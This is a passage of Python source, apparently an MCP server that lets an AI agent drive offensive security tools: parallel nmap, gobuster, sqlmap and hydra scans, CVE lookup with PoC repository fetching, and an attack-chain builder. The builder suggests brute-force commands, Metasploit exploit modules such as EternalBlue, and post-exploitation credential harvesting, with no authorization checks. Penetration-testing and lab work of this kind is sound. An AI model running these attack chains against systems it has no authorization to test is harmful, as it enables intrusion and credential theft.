                await _ldb.save(save_target, "parallel_scan", "scan", cmd_label, detail=raw)
        if all_cves:
            console.print(f"\n[bold red]🚨 CVEs flagged:[/] {', '.join(set(all_cves))}")
            if save_target:
                await _ldb.update_target(save_target, cves=", ".join(set(all_cves)))

        # FIX: window raw outputs before returning — server already windows
        # 60KB head + 30KB tail per command, but 20 commands = ~1.8MB back
        # into model context. Full raw was DB-saved above; the model gets
        # 40KB head + 20KB tail + truncation marker.
        results = [_window_raw(r) for r in results]

        # If anything timed out, nudge the user toward the background job system
        timed_out = [r for r in results if r.get("timed_out")]
        if timed_out:
            console.print(f"\n[yellow]⚠️  {len(timed_out)} command(s) timed out.[/]")
            console.print("[dim]For long-running scans (sqlmap --level=3, ffuf on big "
                          "wordlists), use background=True or scan_start() — they run "
                          "detached and never hit the -32001 MCP timeout.[/]")

        return {
            "results":      results,
            "total_elapsed": result.get("total_elapsed_sec"),
            "cves_flagged": list(set(all_cves)),
            "count":        len(results),
            "timed_out_count": len(timed_out),
        }

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # STAGED PARALLEL — waits per batch, then combines
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="staged_scan")
    async def staged_scan(
        target: str,
        stages: List[Dict[str, Any]],
    ) -> Dict:
        """
        Run scans in stages. Each stage runs its commands IN PARALLEL,
        but stages themselves run SEQUENTIALLY (later stages use earlier results).

        Args:
            target: Target host/URL
            stages: List of stage dicts, each with:
                      - name: stage label
                      - commands: list of shell commands to run in parallel
                      - timeout: (optional) per-stage timeout

        Example stages:
          [
            {"name": "Recon",     "commands": ["nmap -sCV 10.10.10.1", "curl -sk http://10.10.10.1"]},
            {"name": "Web Enum",  "commands": ["gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt", "nikto -h 10.10.10.1"]},
            {"name": "Deep Scan", "commands": ["sqlmap -u 'http://10.10.10.1/login' --batch"]}
          ]
        """
        all_results = []
        all_cves    = []

        for i, stage in enumerate(stages):
            name     = stage.get("name", f"Stage {i+1}")
            cmds     = stage.get("commands", [])
            stimeout = stage.get("timeout", 300)

            console.print(f"\n[bold magenta]━━ Stage {i+1}: {name} ━━[/]")
            result = await parallel_scan(cmds, description=name,
                                         save_target=target, timeout=stimeout)
            all_results.append({"stage": name, **result})
            all_cves.extend(result.get("cves_flagged", []))

        console.print(f"\n[bold green]✅ All {len(stages)} stages complete for {target}[/]")
        if all_cves:
            console.print(f"[bold red]🚨 Total CVEs flagged: {', '.join(set(all_cves))}[/]")

        return {
            "target":     target,
            "stages":     all_results,
            "all_cves":   list(set(all_cves)),
        }

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # SMART ANALYSIS — CVE flagging + attack chains + delta tracking
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="smart_analyze")
    async def smart_analyze(target: str) -> Dict:
        """
        Analyze all findings for a target and produce:
          • OS / service profile
          • CVEs matched against detected services (offline + live enrichment)
          • Delta from last analysis (what changed)
          • Prioritised attack chain recommendations
          • Suggested next commands

        Args:
            target: IP or hostname to analyze

        Returns:
            Profile, CVEs, delta, attack chains, recommended next steps
        """
        # Fetch from server DB
        server_data = await client.get(f"/api/targets/{_urlq(target)}")
        # FIX: server fetch failure previously clobbered a good profile — with
        # server_findings=[], tgt_data={} the run wrote empty os_guess/cves/
        # open_ports over the stored target and POSTed it back to the server.
        if "error" in server_data or server_data.get("success") is False:
            return {"error": True, "target": target,
                    "reason": "Adara server unreachable — profile left untouched",
                    "detail": server_data.get("error")}
        server_findings = server_data.get("findings", [])
        tgt_data = server_data.get("target", {})

        # Sync server findings into local DB (dedup via hash)
        synced = await _ldb.sync_from_server(server_findings, tgt_data)
        if synced:
            console.print(f"[dim]Synced {synced} new findings from server[/]")

        # Get merged local findings (includes synced server data)
        # FIX: LocalDB.get_findings default limit is 2000 rows WITH raw_output
        # — on a busy target that's a multi-MB string built for regex scanning.
        # Cap what we pull into this analysis.
        local_f = await _ldb.get_findings(target, limit=500)

        all_raw = "\n".join(
            f.get("raw_output","") or f.get("detail","")
            for f in (server_findings + local_f)
            if f.get("raw_output") or f.get("detail")
        )

        # CVE matching (offline hints)
        offline_cves = set(flag_cves(all_raw))

        # Extract CVE IDs from nuclei findings and raw text.
        # FIX: normalize to canonical uppercase so the profile never holds
        # case-duplicate entries (e.g. "cve-2021-44228" + "CVE-2021-44228").
        nuclei_cves = set(re.findall(r'CVE-\d{4}-\d{4,7}', all_raw, re.IGNORECASE))
        all_cves = sorted({c.upper() for c in (offline_cves | nuclei_cves)})

        # Live CVE enrichment for new CVEs (if cve_enrichment available)
        enriched_data = []
        poc_data = {}
        if _HAS_CVE_ENRICHMENT and all_cves:
            cves_to_enrich = all_cves[:5]
            console.print(f"[dim]Enriching {len(cves_to_enrich)} CVEs with live data...[/]")
            results = await asyncio.gather(
                *[lookup_cve_all(c) for c in cves_to_enrich],
                return_exceptions=True,
            )
            for r in results:
                if isinstance(r, dict) and r.get("cve_id"):
                    enriched_data.append(r)
                    score = r.get("cvss_score")
                    kev = r.get("cisa_kev")
                    epss = r.get("epss_score")
                    parts = []
                    if score: parts.append(f"CVSS {score}")
                    # FIX: guard EPSS against string values from JSON
                    try:
                        epss_f = float(epss)
                        parts.append(f"EPSS {epss_f*100:.1f}%")
                    except (TypeError, ValueError):
                        pass
                    if kev: parts.append("CISA KEV")
                    summary = " | ".join(parts) if parts else "no risk indicators"
                    console.print(f"  [cyan]{r['cve_id']}[/]: {summary}")

            # Also fetch PoC repos for the most critical CVEs
            from cve_enrichment import lookup_poc_all
            poc_cves = all_cves[:3]
            if poc_cves:
                console.print(f"[dim]Fetching PoC repos for {len(poc_cves)} CVEs...[/]")
                poc_results = await asyncio.gather(
                    *[lookup_poc_all(c) for c in poc_cves],
                    return_exceptions=True,
                )
                for pr in poc_results:
                    if isinstance(pr, dict) and pr.get("all_repos"):
                        poc_data[pr["cve_id"]] = {
                            "total_repos": pr["total_repos"],
                            "repos": [{"full_name": r.get("full_name", ""), "html_url": r.get("html_url", ""),
                                       "stars": r.get("stars", 0), "forks": r.get("forks", 0)}
                                      for r in pr["all_repos"][:5]],
                        }
                        if pr["all_repos"]:
                            console.print(f"  [cyan]{pr['cve_id']}[/]: {len(pr['all_repos'])} PoC repo(s)")

            if enriched_data:
                console.print(f"[green]Enriched {len(enriched_data)}/{len(cves_to_enrich)} CVEs with live data[/]")

        # Parse open ports. FIX: strip trailing separators off service names
        # (nmap rows can end "http," → previously stored "http," verbatim)
        # and dedupe repeated ports so the profile is clean.
        ports = re.findall(r'(\d+)/\w+\s+open\s+(\S+)', all_raw)
        port_map: Dict[str, List[str]] = {}
        for port, svc in ports:
            svc = svc.strip(",.;")
            if not svc:
                continue
            if port not in port_map.setdefault(svc, []):
                port_map[svc].append(port)

        # Build attack chain recommendations
        chains = _build_attack_chains(port_map, all_raw, all_cves, target)

        # OS detection
        os_match = re.search(r'OS details?:\s*(.+)', all_raw)
        os_guess = os_match.group(1).strip() if os_match else tgt_data.get("os_guess", "Unknown")

        # Delta tracking: compare with last analysis
        last_analysis = await _ldb.get_last_analysis(target)
        delta = {"new_findings": synced, "new_cves": [], "new_ports": []}
        if last_analysis:
            old_cves = set(last_analysis.get("analysis_json", {}).get("cves", []))
            delta["new_cves"] = [c for c in all_cves if c not in old_cves]
            old_ports = set(last_analysis.get("analysis_json", {}).get("ports", []))
            current_ports = set(f"{p}/{s}" for s, ps in port_map.items() for p in ps)
            delta["new_ports"] = list(current_ports - old_ports)
            if delta["new_cves"]:
                console.print(f"[bold red]New CVEs since last analysis: {', '.join(delta['new_cves'])}[/]")

        # Update DB with structured JSON
        port_json = json.dumps([{"port": p, "service": s} for s, ps in port_map.items() for p in ps])
        cve_json = json.dumps(all_cves)
        await _ldb.update_target(target, cves=", ".join(all_cves), os_guess=os_guess,
                           open_ports=", ".join(f"{p}({s})" for s, ps in port_map.items() for p in ps),
                           open_ports_json=port_json, cves_json=cve_json)
        await client.post("/api/targets/update", {
            "host": target, "cves": ", ".join(all_cves), "os_guess": os_guess,
            "open_ports_json": port_json, "cves_json": cve_json
        })

        # Save analysis to history
        analysis_data = {
            "host": target, "os_guess": os_guess, "ports": list(f"{p}/{s}" for s, ps in port_map.items() for p in ps),
            "cves": all_cves, "finding_count": len(local_f), "services": list(port_map.keys()),
            "cve_enrichment": enriched_data,
            "poc_repos": poc_data,
        }
        await _ldb.save_analysis(target, analysis_data, delta)
        await client.post("/api/analyses/save", {"target": target, "analysis": analysis_data, "delta": delta})

        # Rich display
        profile = {
            "host": target, "os_guess": os_guess, "services": port_map,
            "cves": all_cves, "finding_count": len(local_f),
        }
        _print_analysis(profile, chains)

        if poc_data:
            for cve_id, info in poc_data.items():
                console.print(f"[cyan]=> PoC repos for {cve_id}:[/] {info['total_repos']} found")
                for r in info.get("repos", []):
                    console.print(f"  [dim]{r['full_name']}[/] ({r['stars']} stars)")

        return {
            "target": target, "os_guess": os_guess, "open_ports": port_map,
            "cves_flagged": all_cves, "attack_chains": chains,
            "finding_count": len(local_f), "delta": delta,
            "synced_from_server": synced,
            "cve_enrichment": enriched_data,
            "poc_repos": poc_data,
        }

    def _build_attack_chains(
        port_map: Dict[str, List[str]],
        raw: str,
        cves: List[str],
        target: str,
    ) -> List[Dict]:
        chains = []
        raw_lower = raw.lower()

        # FTP
        if "ftp" in port_map:
            port = port_map["ftp"][0]
            chain = {"service": "FTP", "port": port, "steps": [
                f"Try anonymous login: ftp {target} (user: anonymous)",
                f"Brute force: hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ftp://{target}",
            ]}
            if "vsftpd 2.3.4" in raw_lower:
                chain["steps"].insert(0, f"⚠️  vsftpd 2.3.4 BACKDOOR — use MSF: exploit/unix/ftp/vsftpd_234_backdoor RHOSTS={target}")
            chains.append(chain)

        # SSH
        if "ssh" in port_map:
            port = port_map["ssh"][0]
            chains.append({"service": "SSH", "port": port, "steps": [
                f"Try default creds: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target}:{port}",
                f"If creds found, connect via ssh_connect tool (persistent session)",
                f"Once in: run sudo -l, find SUID, check cron, check /etc/passwd",
            ]})

        # HTTP/HTTPS
        for svc in ["http","https","http-alt","http-proxy"]:
            if svc in port_map:
                port = port_map[svc][0]
                chains.append({"service": svc.upper(), "port": port, "steps": [
                    f"Directory brute: gobuster dir -u http://{target}:{port} -w /usr/share/wordlists/dirb/common.txt -x php,txt,html",
                    f"Nikto scan: nikto -h {target} -p {port}",
                    f"Wafw00f: wafw00f http://{target}:{port}",
                    f"SQLi test: sqlmap -u 'http://{target}:{port}/login' --batch",
                    f"If PHP: LFI test with /etc/passwd, log poisoning",
                ]})
                if "log4j" in raw_lower or "log4shell" in raw_lower:
                    chains[-1]["steps"].insert(0, "⚠️  Log4Shell detected! Test JNDI injection in headers")

        # SMB
        if "microsoft-ds" in port_map or "netbios-ssn" in port_map or "smb" in port_map:
            port = "445"
            chain = {"service": "SMB", "port": port, "steps": [
                f"Enum shares: smbclient -L //{target} -N",
                f"CrackMapExec: crackmapexec smb {target} --shares",
                f"Enum4linux: enum4linux -a {target}",
                f"Brute force: hydra -L users.txt -P passwords.txt smb://{target}",
            ]}
            if "ms17-010" in raw_lower or "eternal" in raw_lower:
                chain["steps"].insert(0, f"⚠️  EternalBlue (MS17-010)! MSF: exploit/windows/smb/ms17_010_eternalblue RHOSTS={target}")
            chains.append(chain)

        # RDP
        if "ms-wbt-server" in port_map or "rdp" in port_map:
            chains.append({"service": "RDP", "port": "3389", "steps": [
                f"BlueKeep check: nmap -p 3389 --script rdp-vuln-ms12-020 {target}",
                f"Brute force: hydra -L users.txt -P passwords.txt rdp://{target}",
                f"xfreerdp /u:user /p:pass /v:{target}",
            ]})

        # MySQL / MSSQL / PostgreSQL
        for db_svc, db_port, db_tool in [
            ("mysql","3306","mysql -h {t} -u root -p"),
            ("ms-sql-s","1433","sqsh -S {t} -U sa"),
            ("postgresql","5432","psql -h {t} -U postgres"),
        ]:
            if db_svc in port_map:
                chains.append({"service": db_svc.upper(), "port": db_port, "steps": [
                    f"Connect: {db_tool.format(t=target)}",
                    f"SQLmap: sqlmap -d '{db_svc}://root:@{target}/{db_port}' --dbs",
                ]})

        # CVE-based exploit chains — universal for ALL CVEs found
        if cves:
            exploit_steps = [
                f"Known CVEs: {', '.join(cves[:5])}",
                # Use the new MSF tools
                f"msf_search(sid, 'cve:{cves[0].split('(')[0].strip()}') — find matching MSF modules",
                f"msf_info(sid, '<module_name>') — see required options and available payloads",
                "Then run: msf_interactive_run(sid, module, options, payload='...', lhost='<your_ip>')",
            ]
            # Add specific well-known exploit module hints
            cve_module_hints = {
                "CVE-2011-2523": "exploit/unix/ftp/vsftpd_234_backdoor",
                "CVE-2017-0144": "exploit/windows/smb/ms17_010_eternalblue",
                "CVE-2021-44228": "exploit/multi/http/log4shell_header_injection",
                "CVE-2014-6271": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
                "CVE-2017-5638": "exploit/multi/http/struts2_content_type_ognl",
                "CVE-2021-41773": "exploit/multi/http/apache_normalize_path_rce",
                "CVE-2018-7600": "exploit/unix/webapp/drupal_drupalgeddon2",
                "CVE-2017-7494": "exploit/linux/samba/is_known_pipename",
                "CVE-2021-3156": "exploit/linux/local/sudo_baron_samedit",
                "CVE-2016-5195": "exploit/linux/local/dirtycow",
                "CVE-2021-4034": "exploit/linux/local/polkit_privesc",
                "CVE-2018-15473": "auxiliary/scanner/ssh/ssh_enumusers",
                "CVE-2017-12617": "exploit/multi/http/tomcat_put_exec",
            }
            for cve_id, module_path in cve_module_hints.items():
                if cve_id in str(cves):
                    exploit_steps.append(f"\u26a0\ufe0f  Direct module: {module_path}")
                    break
            chains.append({"service": "CVE Exploits", "port": "various", "steps": exploit_steps})

        # Post-exploitation suggestions — uses new structured tools
        chains.append({"service": "Post-Exploitation", "port": "N/A", "steps": [
            "If netcat: session_upgrade_shell(sid) — stabilize to full PTY",
            "post_enum_system(sid) — automated system enumeration (users, ports, processes)",
            "post_enum_privesc(sid) — privilege escalation vectors (sudo, SUID, capabilities)",
            "post_harvest_creds(sid) — credential harvesting (shadow, SSH keys, history)",
            "For MSF sessions: msf_session_interact(sid, session_num, ['sysinfo','getuid'])",
        ]})

        return chains

    def _print_analysis(profile: Dict, chains: List[Dict]):
        console.print(Panel(
            f"[cyan]Host:[/]     {profile['host']}\n"
            f"[cyan]OS:[/]       [yellow]{profile['os_guess']}[/]\n"
            f"[cyan]Services:[/] {', '.join(profile['services'].keys()) or 'none'}\n"
            f"[cyan]CVEs:[/]     [bold red]{', '.join(profile['cves']) or 'None flagged'}[/]\n"
            f"[cyan]Findings:[/] {profile['finding_count']}",
            title="🧠 Smart Analysis", border_style="magenta"
        ))

        t = Table(title="⚔️  Attack Chains", box=box.ROUNDED,
                  title_style="bold red", header_style="bold cyan", show_lines=True)
        t.add_column("Service", style="yellow", width=16)
        t.add_column("Port", width=6)
        t.add_column("Steps")
        for c in chains:
            steps = "\n".join(f"• {s}" for s in c["steps"])
            t.add_row(c["service"], str(c["port"]), steps)
        console.print(t)

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # INDIVIDUAL TOOL WRAPPERS (all async)
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="nmap_scan")
    async def nmap_scan(target: str, scan_type: str = "-sCV",
                        ports: str = "", additional_args: str = "-T4 -Pn",
                        background: bool = False) -> Dict:
        """Nmap scan. Returns open ports, services, OS detection, NSE script results.

        IMPORTANT: the default scan only probes the top-1000 ports. Ports
        like 80081, 55368, 1337 etc. will NOT show up. If only common ports
        (21/22/80/443) appear and you want hidden ones, use full_port_scan
        (sweeps all 65535 TCP ports) instead.

        Args:
            background: If True, run detached (avoids timeout on slow -sC/-A scans).

        NOTE: scans that outlive the server's sync budget are auto-backgrounded
        even when background=False — the call returns fast with a job_id
        (auto_backgrounded=true); track the result with scan_status/scan_wait.
        """
        console.print(f"[cyan]🔍 Nmap:[/] {target}"
                     + ("  [yellow](background)[/]" if background else ""))
        return await client.post("/api/tools/nmap", {
            "target": target, "scan_type": scan_type,
            "ports": ports, "additional_args": additional_args,
            "background": background,
        })

    @mcp.tool(name="full_port_scan")
    async def full_port_scan(target: str, min_rate: int = 1500,
                             udp: bool = False, version_scan: bool = True,
                             background: bool = False) -> Dict:
        """
        Full-range two-pass port discovery — finds the ports normal nmap
        misses. Pass 1 sweeps ALL 65535 TCP ports at high speed
        (-p- --min-rate 1500); pass 2 runs -sCV against the discovered
        ports for service/version/NSE. Returns a COMPACT STRUCTURED payload
        (open ports + service + version + trimmed NSE scripts, OS guess) —
        not the raw nmap text, so the agent context stays lean.

        Use this whenever the standard nmap scan shows only common ports
        (21/22/80/443) or when a service is expected on a non-standard port
        (80081, 55368, 4437, 1337, ...).

        Args:
            target:        IP or hostname
            min_rate:      pass-1 packets/sec (default 1500; ~45s for full range)
            udp:           also sweep top-100 UDP ports
            version_scan:  pass 2 -sCV on discovered ports (default True)
            background:    run detached if the target is slow

        Returns:
            open_ports: [{port, proto, service, product, version, cpe, scripts}]
            total_open_ports, os_guess, scan_command, note

        NOTE: slow scans auto-background (auto_backgrounded=true → job_id);
        poll with scan_status/scan_wait. Versions found also auto-trigger a
        CVE lookup (result['cves']) — no separate search_service_cves needed.
        """
        console.print(f"[cyan]🛰 Full port scan:[/] {target}"
                     + ("  [yellow](background)[/]" if background else ""))
        return await client.post("/api/tools/full_port_scan", {
            "target": target, "min_rate": min_rate, "udp": udp,
            "version_scan": version_scan, "background": background,
        })

    @mcp.tool(name="gobuster_scan")
    async def gobuster_scan(url: str, mode: str = "dir",
                            wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                            additional_args: str = "-t 30 --no-error",
                            status_codes: str = "",
                            deep: bool = False,
                            background: bool = False) -> Dict:
        """Gobuster directory/DNS/vhost brute force.

        IMPORTANT: the default wordlist (common.txt, ~4600 words) misses most
        hidden paths — admin panels, /backup, /api, .env, .git, config.php.bak.
        If the standard scan finds nothing, retry with deep=True (bigger
        wordlist + extensions php,txt,bak,zip + recursive) or pass a bigger
        wordlist explicitly. Returns parsed_paths (structured list) + raw.

        Args:
            url: Target URL
            mode: Scan mode (dir, dns, fuzz, vhost)
            wordlist: Path to wordlist
            additional_args: Extra gobuster arguments
            status_codes: Comma-separated status codes to show (e.g. '200,301,302').
                          If set, automatically removes conflicting blacklist flags.
            deep: If True, auto-escalate: biggest wordlist available +
                  common extensions (-x php,txt,bak,zip,...) + recursive (-r)
            background: If True, run detached (avoids timeout on big wordlists).
        """
        console.print(f"[cyan]🗂️  Gobuster:[/] {url}"
                     + ("  [yellow](deep)[/]" if deep else "")
                     + ("  [yellow](background)[/]" if background else ""))
        return await client.post("/api/tools/gobuster", {
            "url": url, "mode": mode,
            "wordlist": wordlist, "additional_args": additional_args,
            "status_codes": status_codes,
            "deep": deep,
            "background": background,
        })

    @mcp.tool(name="dirb_scan")
    async def dirb_scan(url: str,
                        wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                        additional_args: str = "",
                        deep: bool = False) -> Dict:
        """Dirb web content scanner.

        IMPORTANT: default common.txt wordlist (~4600 words) misses hidden
        paths. If nothing found, retry with deep=True (biggest wordlist on
        the box + recursive) or a bigger wordlist. Returns parsed_paths
        (structured list of found URLs with status/size) + raw.

        Args:
            deep: auto-escalate wordlist + recursive mode
        """
        return await client.post("/api/tools/dirb", {
            "url": url, "wordlist": wordlist, "additional_args": additional_args,
            "deep": deep,
        })

    @mcp.tool(name="nikto_scan")
    async def nikto_scan(target: str, additional_args: str = "",
                         deep: bool = False,
                         background: bool = False) -> Dict:
        """Nikto web vulnerability scanner.

        IMPORTANT: default tuning misses many checks (misconfig, info leaks,
        injection, remote source disclosure). If the standard scan is clean,
        retry with deep=True → -Tuning 123bde -Display V.

        Args:
            target: Target - can be IP (192.168.1.21), URL (http://192.168.1.21),
                    or URL with port (http://192.168.1.21:8080). Server handles parsing.
            additional_args: Extra nikto arguments (e.g. '-Tuning x -Display V')
            deep: full tuning (files, misconfig, info leak, injection, disclosure)
            background: If True, run detached (avoids timeout on full scans).
        """
        console.print(f"[cyan]🕷️  Nikto:[/] {target}"
                     + ("  [yellow](deep)[/]" if deep else "")
                     + ("  [yellow](background)[/]" if background else ""))
        return await client.post("/api/tools/nikto", {
            "target": target, "additional_args": additional_args,
            "deep": deep,
            "background": background,
        })

    @mcp.tool(name="sqlmap_scan")
    async def sqlmap_scan(url: str, data: str = "",
                          additional_args: str = "--batch --level=2 --risk=2",
                          deep: bool = False,
                          background: bool = False) -> Dict:
        """SQLMap SQL injection scanner.

        IMPORTANT: the default --level=2 --risk=2 only tests the main
        parameter. It MISSES injection in cookies, headers, other GET/POST
        params, and deep payloads. If no injection is found:
          • retry with deep=True → --level=5 --risk=3 --crawl=2 --smart
            (tests every parameter + follows links; slow but thorough)
          • for blind techniques use background=True + scan_wait
        Output is compacted to injection-relevant lines.

        Args:
            deep: full-intensity scan (level 5 / risk 3 / crawl 2)
            background: If True, run DETACHED via the job system — returns a
                        job_id immediately instead of blocking (and never hits
                        the -32001 timeout). Use scan_status/scan_wait to follow.
        """
        console.print(f"[cyan]💉 SQLMap:[/] {url}"
                     + ("  [yellow](deep)[/]" if deep else "")
                     + ("  [yellow](background)[/]" if background else ""))
        result = await client.post("/api/tools/sqlmap", {
            "url": url, "data": data, "additional_args": additional_args,
            "deep": deep,
            "background": background,
        })
        if background and result.get("job_id"):
            console.print(f"[green]✅ Running in background:[/] {result['job_id']} "
                         f"— poll with scan_status/scan_wait")
        return result

    @mcp.tool(name="wafw00f_scan")
    async def wafw00f_scan(url: str, additional_args: str = "") -> Dict:
        """Wafw00f WAF detection.

        IMPORTANT: a negative result does NOT mean no WAF — try additional_args
        '-a' (aggressive) and cross-check response headers manually
        (curl -skI <url> | grep -i 'server\|x-powered-by').
        """
        return await client.post("/api/tools/wafw00f", {"url": url, "additional_args": additional_args})

    @mcp.tool(name="ffuf_scan")
    async def ffuf_scan(url: str,
                        wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                        additional_args: str = "-c -t 40",
                        deep: bool = False,
                        background: bool = False) -> Dict:
        """FFuf fuzzer — fast web content discovery.

        IMPORTANT: default common.txt wordlist misses hidden paths. If
        nothing found, retry with deep=True (biggest wordlist + -mc all
        -fc 404). Returns parsed_results (compact list: url/status/length,
        capped at 50) — the full dump stays on disk + in the DB.

        Args:
            url: Base target URL (e.g. http://10.10.10.5 or
                 http://10.10.10.5/path). The server appends /FUZZ itself —
                 a trailing /FUZZ is tolerated and deduplicated.
            deep: auto-escalate wordlist + match-all filter-404 mode
            background: If True, run detached (avoids timeout on big wordlists).
                        Returns a job_id; use scan_status/scan_wait to follow.
        """
        return await client.post("/api/tools/ffuf", {
            "url": url, "wordlist": wordlist, "additional_args": additional_args,
            "deep": deep,
            "background": background,
        })

    @mcp.tool(name="hydra_attack")
    async def hydra_attack(target: str, service: str, username: str = "",
                           username_file: str = "", password: str = "",
                           password_file: str = "", additional_args: str = "",
                           background: bool = False) -> Dict:
        """Hydra password brute force for SSH, FTP, HTTP, SMB, etc.

        IMPORTANT: always pass a password_file (default is empty — no list,
        no guesses). Use /usr/share/wordlists/rockyou.txt. If the run finds
        nothing:
          • check the service actually accepts logins (nc -zv <host> <port>)
          • add --rules for mutation, or a bigger/more targeted wordlist
          • old SSH targets (OpenSSH < 5.x) fail on KEX/MAC — use ncrack
            instead: ncrack -v --user root -P /usr/share/wordlists/rockyou.txt ssh://TARGET:22
            or the metasploit ssh_login module.

        Args:
            background: If True, run detached (avoids timeout on large wordlists).
        """
        console.print(f"[yellow]🔑 Hydra:[/] {service}://{target}"
                     + ("  [yellow](background)[/]" if background else ""))
        result = await client.post("/api/tools/hydra", {
            "target": target, "service": service,
            "username": username, "username_file": username_file,
            "password": password, "password_file": password_file,
            "additional_args": additional_args,
            "background": background,
        })
        # Show diagnostic if Hydra returned empty
        if result.get("diagnostic") == "ssh_legacy_incompatibility":
            console.print(f"[yellow]⚠️  SSH legacy incompatibility detected.[/]")
            console.print(f"[yellow]Suggestion: {result.get('suggestion', 'Use ncrack or metasploit instead')}")
        elif result.get("diagnostic") == "empty_response":
            console.print(f"[yellow]⚠️  Hydra returned empty output. Check diagnostics in result.[/]")
        return result

    @mcp.tool(name="john_crack")
    async def john_crack(hash_file: str,
                         wordlist: str = "/usr/share/wordlists/rockyou.txt",
                         format_type: str = "", additional_args: str = "") -> Dict:
        """John the Ripper hash cracker.

        After cracking, automatically runs john --show to display cracked passwords.
        If hash_file doesn't exist on server, returns a helpful error.

        IMPORTANT: if no hash cracks, escalate before giving up:
          • verify the format (format_type='md5crypt'/'sha512crypt'/'NT')
          • use additional_args='--rules' (mutation) or a bigger wordlist
          • if the server reports wordlist_missing, install/gunzip rockyou
            first — a bare john run (no dictionary) almost always misses.

        Args:
            hash_file:       Path to hash file on the Adara server (e.g. /tmp/hashes.txt)
            wordlist:        Wordlist path (default: rockyou.txt)
            format_type:     Hash format (e.g. 'md5crypt', 'sha512crypt', 'NT'). Leave blank for auto-detect.
            additional_args: Extra john arguments
        """
        console.print(f"[yellow]🔓 John the Ripper:[/] {hash_file}")
        result = await client.post("/api/tools/john", {
            "hash_file": hash_file, "wordlist": wordlist,
            "format_type": format_type, "additional_args": additional_args
        })
        # FIX: Show cracked results automatically by running john --show
        if result.get("success") or result.get("stdout"):
            console.print("[green]John finished. Fetching cracked passwords...[/]")
            # Run john --show on the same file to get cracked passwords
            show_result = await client.post("/api/tools/john", {
                "hash_file": hash_file,
                "wordlist": "",
                "format_type": format_type,
                "additional_args": "--show",
            })
            cracked_output = show_result.get("stdout", "").strip()
            if cracked_output:
                console.print(f"[bold green]🔑 Cracked passwords:[/]")
                console.print(cracked_output[:2000])
                result["cracked_passwords"] = cracked_output
            else:
                console.print("[dim]No passwords cracked yet (or already shown in stdout above)[/]")
        elif result.get("diagnostic"):
            console.print(f"[yellow]⚠️  John diagnostic: {result.get('diagnostic')}[/]")
            if result.get("stderr"):
                console.print(f"[dim]{result['stderr'][:300]}[/]")
        return result

    @mcp.tool(name="wpscan_analyze")
    async def wpscan_analyze(url: str, additional_args: str = "--enumerate vp,u",
                             deep: bool = False,
                             background: bool = False) -> Dict:
        """WPScan WordPress vulnerability scanner.

        IMPORTANT: default --enumerate vp,u finds plugins+users but misses
        themes, timthumb and aggressive plugin detection. If nothing found,
        retry with deep=True (--enumerate vp,vt,tt,u --plugins-detection
        aggressive) or --enumerate ap,at,cb,dbe (everything).

        Args:
            deep: full enumeration + aggressive plugin detection
            background: If True, run detached (avoids timeout on full enumeration).
        """
        return await client.post("/api/tools/wpscan", {
            "url": url, "additional_args": additional_args,
            "deep": deep,
            "background": background,
        })

    @mcp.tool(name="enum4linux_scan")
    async def enum4linux_scan(target: str, additional_args: str = "-a") -> Dict:
        """Enum4linux Windows/Samba enumeration."""
        console.print(f"[cyan]🔎 Enum4linux:[/] {target}")
        result = await client.post("/api/tools/enum4linux", {"target": target, "additional_args": additional_args})
        if result.get("diagnostic") == "binary_missing":
            console.print(f"[red]❌ enum4linux not installed on server.[/]")
            console.print(f"[yellow]Suggestion:[/] {result.get('suggestion', 'Install enum4linux: sudo apt install enum4linux')}")
            console.print(f"[dim]Alternative: use crackmapexec_scan or execute_command('smbclient -L //{target} -N')[/]")
        elif result.get("diagnostic") == "empty_response":
            console.print(f"[yellow]⚠️  enum4linux returned no output: {result.get('stderr', '')}[/]")
        elif result.get("stdout"):
            console.print(f"[green]✅ enum4linux complete ({len(result['stdout'])} bytes)[/]")
        return result

    @mcp.tool(name="crackmapexec_scan")
    async def crackmapexec_scan(target: str, service: str = "smb",
                                 username: str = "", password: str = "",
                                 deep: bool = False,
                                 additional_args: str = "") -> Dict:
        """CrackMapExec SMB/SSH/LDAP scanner.

        IMPORTANT: with no credentials the bare command only shows a banner
        (null-session checks) and misses shares/users/password policy. Pass
        username/password, and use deep=True to also run
        --shares --users --pass-pol. If the result is empty, the account
        may have no permissions — try a different user or null session
        (-u '' -p '')."""
        return await client.post("/api/tools/crackmapexec", {
            "target": target, "service": service,
            "username": username, "password": password,
            "deep": deep,
            "additional_args": additional_args
        })

    @mcp.tool(name="nuclei_scan")
    async def nuclei_scan(
        target: str,
        scan_type: str = "",
        templates: str = "",
        severity: str = "",
        tags: str = "",
        template_dir: str = "",
        rate_limit: int = 150,
        concurrency: int = 25,
        timeout_secs: int = 10,
        additional_args: str = "",
        background: bool = False,
    ) -> Dict:
        """
        Run Nuclei vulnerability scanner — template-based, fast, covers 9000+ templates.

        IMPORTANT: with scan_type empty (default), nuclei only runs its
        default template set — many CVEs/misconfigs are missed. Escalate when
        clean: scan_type='cves' (CVEs), 'exposure' (exposed files/panels),
        'misconfig', or 'full' for everything (slow — use background=True).

        Args:
            target:         Target URL, IP, or CIDR (e.g. 'http://10.10.10.5', '10.10.10.5', '10.0.0.0/24')
            scan_type:      Shorthand presets: 'full' (all), 'cves', 'misconfig', 'exposure',
                            'dns', 'tech', 'fuzz', 'panels', 'vuln', 'default'
            templates:      Comma-separated template IDs or paths
                            e.g. 'cves/2021/CVE-2021-44228,cves/2017/CVE-2017-0144'
            severity:       Filter by severity: 'info,low,medium,high,critical'
            tags:           Template tags (comma-separated): 'cve,misconfig,exposure'
            template_dir:   Custom template directory path
            rate_limit:     Requests per second (default 150)
            concurrency:    Concurrent templates (default 25)
            timeout_secs:   Per-request timeout seconds (default 10)
            additional_args: Extra nuclei flags
            background:     If True, run detached (avoids timeout on full-template runs).
